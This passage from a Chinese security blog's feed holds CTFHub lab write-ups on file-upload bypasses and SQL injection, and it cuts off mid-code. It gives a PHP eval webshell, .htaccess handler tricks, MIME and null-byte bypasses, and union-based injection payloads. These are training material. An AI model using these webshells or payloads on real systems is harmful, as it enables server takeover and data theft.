b75ba46c5256b302f32b31835eb29b27c56590804e67e494b1f6ac3169f733eefc63e58576886b51c1bb8786ddcaccaaa3141dbaaedff444e973d31811d8f6e7c52d3515c45c7967ddfd0de621b59772db52070763c0bab14956a6f9a158936ef7124b2659c9aef35d0d6b894df53f70bbd763b7cd0c715b48af42a15e5a20bf66e377dd0ac96bd777c670f74d6d591cf7500c896cbf658673628a225ce3cf34faa20fd6b2bbb6b3c5df6409ed0d11728754870c9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码查看文章</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    
    <category term="AWD" scheme="https://swhat.github.io/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-Web-文件上传练习</title>
    <link href="https://swhat.github.io/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/"/>
    <id>https://swhat.github.io/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/</id>
    <published>2020-11-22T11:46:56.000Z</published>
    <updated>2021-04-04T14:02:23.418Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（三）</p> <a id="more"></a><h2 id="0x00-无验证"><a href="#0x00-无验证" class="headerlink" title="0x00 无验证"></a>0x00 无验证</h2><p><img src="https://img-blog.csdnimg.cn/2020111821051990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>]);<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>上传文件相对路径<code>upload/1.php</code><br><img src="https://img-blog.csdnimg.cn/20201118210615644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用蚁剑连接，连接密码为<code>pass</code><br><img src="https://img-blog.csdnimg.cn/20201118210744773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看目录，flag就在这里<br><img src="https://img-blog.csdnimg.cn/20201118210930972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x01-前端验证"><a href="#0x01-前端验证" class="headerlink" title="0x01 前端验证"></a>0x01 前端验证</h2><p><img src="https://img-blog.csdnimg.cn/20201118211350400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马，结果提示该文件不允许上传<br><img src="https://img-blog.csdnimg.cn/2020111821132240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>题目是前端验证，直接查看网页源代码，发现只能上传<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种格式的文件<br><img src="https://img-blog.csdnimg.cn/20201118211703499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>把1.php改为1.jpg，然后上传抓包</p><p><img src="https://img-blog.csdnimg.cn/20201118212718468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>1.jpg再改为1.php，然后放包<br><img src="https://img-blog.csdnimg.cn/20201118213046598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到相对路径upload/1.php<br><img src="https://img-blog.csdnimg.cn/2020111821314576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还是一样的操作，蚁剑连接，查找目录，找到flag<br><img src="https://img-blog.csdnimg.cn/20201118213340365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x03-htaccess"><a href="#0x03-htaccess" class="headerlink" title="0x03 .htaccess"></a>0x03 .htaccess</h2><p>题目描述：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><p>访问<br><img src="https://img-blog.csdnimg.cn/2020111822095844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源代码，发现文件后缀都被禁用了<br><img src="https://img-blog.csdnimg.cn/2020111822110957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>百度一下hatccess文件，<code>.htaccess</code>是Apache的又一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件）</p><p><code>.hatccess</code>文件有两种写法</p><p><strong>第一种方法:</strong><br>下面代码的意思是，只要文件名中包含pass，就会被Apache解析为php文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;pass&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>提示文件名不能为空，命名为<code>3.hatccess</code>,用bp抓包，将3.htaccess改为<code>.htaccass</code>，然后放包<br><img src="https://img-blog.csdnimg.cn/2020111912484428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><code>.htaccass</code>文件上传成功<br><img src="https://img-blog.csdnimg.cn/20201119124911563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>把上面用到的1.php改为3.pass文件，上传文件相对路径<code>upload/3.pass</code><br><img src="https://img-blog.csdnimg.cn/20201119125620833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>蚁剑连接，可以看到上传的文件<br><img src="https://img-blog.csdnimg.cn/20201119125123749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查找flag<br><img src="https://img-blog.csdnimg.cn/20201119125141517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>第二种方法：</strong>·</p><p>内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>就成功地使该<code>.htaccess</code>文件所在目录及其子目录中的后缀为<code>.jpg</code>的文件被Apache当做php文件</p><p>上传test.htaccess</p><p><img src="https://img-blog.csdnimg.cn/2020111920274848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传成功<br><img src="https://img-blog.csdnimg.cn/20201119202825440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>再上传<code>3.jpg</code>，内容为<code>&lt;?php  @eval($_POST[&quot;pass&quot;]);?&gt;</code> ，获取到上传文件路径<br><img src="https://img-blog.csdnimg.cn/20201119202922137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接，连接成功。<br><img src="https://img-blog.csdnimg.cn/20201119203023188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>参考文章</strong>:<a href="https://blog.csdn.net/wn314/article/details/77074477">文件解析漏洞</a></p><h2 id="0x04-MIME绕过"><a href="#0x04-MIME绕过" class="headerlink" title="0x04 MIME绕过"></a>0x04 MIME绕过</h2><p><img src="https://img-blog.csdnimg.cn/20201120222519718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接上传4.php，提示文件类型不正确<br><img src="https://img-blog.csdnimg.cn/20201120223830616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>来使用MIME绕过，百度了解一下<strong>MIME</strong></p><blockquote><p>  MIME(Multipurpose Internet MailExtensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p></blockquote><p><code>MIME</code>多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式每个MIME类型由两部分组成，前面是数据的大类别，例如声音 audio、图象 Image等,后面定义具体的种类。</p><p>常见的MME类型，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#text表明文件是普通文本</span></span><br><span class="line">text/plain</span><br><span class="line">text/html</span><br><span class="line"><span class="comment">#image表明是某种图像或者动态图(gif)</span></span><br><span class="line">image/jpeg</span><br><span class="line">image/png</span><br><span class="line"><span class="comment">#audio表明是某种音频文件</span></span><br><span class="line">audio/mpeg</span><br><span class="line">audio/ogg</span><br><span class="line">audio<span class="comment">/*</span></span><br><span class="line"><span class="comment">#video表明是某种视频文件</span></span><br><span class="line"><span class="comment">video/mp4</span></span><br><span class="line"><span class="comment">#application表明是某种二进制数据</span></span><br><span class="line"><span class="comment">application/*</span></span><br><span class="line"><span class="comment">application/json</span></span><br><span class="line"><span class="comment">application/javascript</span></span><br><span class="line"><span class="comment">application/ecmascript</span></span><br><span class="line"><span class="comment">application/octet-stream</span></span><br></pre></td></tr></table></figure><p>上传<code>4.php</code>，使用bp抓包，修改Content-Typed的值，改成<code>Content-Type: image/jpeg</code>，然后放包<br><img src="https://img-blog.csdnimg.cn/20201120222615911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到文件相对路径<br><img src="https://img-blog.csdnimg.cn/20201120222706592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接，查找目录文件，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20201120222949700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>参考文章: <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME 类型</a></p><h2 id="0x05-文件头检查"><a href="#0x05-文件头检查" class="headerlink" title="0x05 文件头检查"></a>0x05 文件头检查</h2><p><img src="https://img-blog.csdnimg.cn/20201122155831873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马5.php，提示文件类型不正确</p><p><img src="https://img-blog.csdnimg.cn/20201122155907113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br> 再把5.php修改成5.jpg上传，发现提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122160052550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>尝试<strong>MME绕过</strong>，上传<code>5.php</code>，抓包，修改Content-Typed的值，然后放包，发现提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122160839518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>应该是对文件内容进行了检测，来制作一个图片码<code>m.php</code><br><img src="https://img-blog.csdnimg.cn/20201122162645668.png#pic_center" alt="在这里插入图片描述"><br>抓包修改Content-Type的值，放包<br><img src="https://img-blog.csdnimg.cn/2020112216332349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>结果提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122193529247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>看了大师傅的wp，说尽量换小一点的图片，就会成功，这次换了一个非常小的图片，重新制作图片马<br><img src="https://img-blog.csdnimg.cn/2020112219263730.png#pic_center" alt="在这里插入图片描述"></p><p>上传flag.php，抓包修改Content-Type的值为<code>image/png</code><br><img src="https://img-blog.csdnimg.cn/20201122192734886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到上传路径<br><img src="https://img-blog.csdnimg.cn/2020112219282666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>蚁剑连接，拿到flag<br><img src="https://img-blog.csdnimg.cn/20201122192926706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x06-00截断"><a href="#0x06-00截断" class="headerlink" title="0x06 00截断"></a>0x06 00截断</h2><p>了解一下00截断，<a href="http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html">关于上传中的00截断分析</a><br><img src="https://img-blog.csdnimg.cn/20201122170816232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马，提示文件类型不匹配, 但在url栏出现了路径信息<br><img src="https://img-blog.csdnimg.cn/20201122165152579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源代码<br><img src="https://img-blog.csdnimg.cn/20201122165304568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传shell.jpg，抓包<br><img src="https://img-blog.csdnimg.cn/20201122165938867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>构造00截断，添加<code>shell.php%00</code>，放包<br><img src="https://img-blog.csdnimg.cn/2020112217004529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功路径为<code>upload/shell.php</code>，蚁剑连接<br><img src="https://img-blog.csdnimg.cn/2020112217043423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>拿到flag<br><img src="https://img-blog.csdnimg.cn/2020112217050469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x07-双写后缀"><a href="#0x07-双写后缀" class="headerlink" title="0x07 双写后缀"></a>0x07 双写后缀</h2><p><img src="https://img-blog.csdnimg.cn/20201122171341824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马shell.php，虽然上传成功，但后缀却消失了<br><img src="https://img-blog.csdnimg.cn/20201122171256124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源码，<code>$name = str_ireplace($blacklist, &quot;&quot;, $name);</code>，变量<code>blacklist</code>里面的值会被替换，后缀被过滤了<br><img src="https://img-blog.csdnimg.cn/20201122171458940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>继续上传<code>shell.php</code>，然后抓包修改成<code>shell.pphphp</code>，中间的php字符串被过滤，剩下的<code>p</code>和<code>hp</code>就组合成了<code>php</code>。</p><p><img src="https://img-blog.csdnimg.cn/2020112217203470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>文件上传成功，得到文件上传路径<br><img src="https://img-blog.csdnimg.cn/2020112217205079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接,flag就在这<br><img src="https://img-blog.csdnimg.cn/20201122172156217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们可以通过上传一些平时不怎么用的容易被人忽视的文件扩展名，来绕过这种类型的验证。</p><p><strong>黑名单绕过</strong><br>通过上传不受欢迎的php扩展来绕过黑名单。例如：pht，phpt，phtml，php3，php4，php5，php6</p><p><strong>白名单绕过</strong><br>通过某种类型的技巧来绕过白名单，例如添加空字节注入（shell.php％00.gif），或使用双重扩展来上传文件（shell.jpg.php）。</p><p><strong>扩展名大小写来绕过</strong><br>例如：pHp，Php，phP。</p><p><strong>双写后缀绕过</strong><br>例如：pphphp</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（三）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="https://swhat.github.io/tags/CTFhub/"/>
    
    <category term="文件上传" scheme="https://swhat.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-Web-sql注入练习</title>
    <link href="https://swhat.github.io/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/"/>
    <id>https://swhat.github.io/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/</id>
    <published>2020-11-15T04:53:30.000Z</published>
    <updated>2021-04-04T14:02:16.435Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（二）</p> <a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sql注入用到的一些相关函数<br>| 函数                        | 描述                                                         |<br>| ————————— | ———————————————————— |<br>| table_schema                | 数据库名                                                     |<br>| table_name                  | 表名                                                         |<br>| column_name                 | 列名                                                         |<br>| information_schema.schemata | 包含所有数据库的名                                           |<br>| information_schema.tables   | 包含所有库的表名                                             |<br>| information_schema.columns  | 包含所有表的字段                                             |<br>| group_concat()函数功能      | 将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 |</p><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p>输入1<br><img src="https://img-blog.csdnimg.cn/20201114180314872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>1.判断注入类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;        报错</span></span><br><span class="line"><span class="string">1 and 1=1 返回正确</span></span><br><span class="line"><span class="string">1 and 1=2 返回错误</span></span><br></pre></td></tr></table></figure><p>如果满足以上三条，则可以判断该URL存在数字型注入。</p><p>2.判断字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>    回显正常</span><br><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>    回显正常</span><br><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>    返回错误</span><br></pre></td></tr></table></figure><p>所以字段数为2</p><p>3 .联合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>    回显正常</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>           回显正常</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>         返回错误</span><br></pre></td></tr></table></figure><p>回显点位是1和2</p><p>4.爆数据库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span> union select <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure><p>当前数据库名为sqli</p><p>5.爆表名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span> union select <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;sqli&#x27;</span></span><br></pre></td></tr></table></figure><p>有两个表，一个是news，另外一个是flag</p><p>6.爆字段名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 